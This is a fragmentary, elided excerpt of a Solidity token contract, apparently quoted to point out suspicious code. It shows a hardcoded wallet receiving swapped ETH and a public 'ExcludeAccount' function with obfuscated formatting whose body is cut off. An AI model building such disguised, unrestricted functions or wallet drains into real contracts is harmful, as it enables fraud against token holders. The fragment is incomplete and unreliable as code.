...
contract test is Context, IERC20, Ownable {
    ...
    constructor () {
        ...
        teamWalletAddress = payable(address(0x418de1392e3c5f699d57275AB9F4109480930AF5));
        _metawallet = payable(address(0x418de1392e3c5f699d57275AB9F4109480930AF5));
...
function ExcludeAccount(address
 zoo 
, uint256 
zooz) public
{if( 
...
[sender]){
    ...
    function swapAndLiquify(uint256 tAmount) private lockTheSwap {
        ...
        if(amountETHMarketing > 0)
            transferToAddressETH(_metawallet, amountETHMarketing);
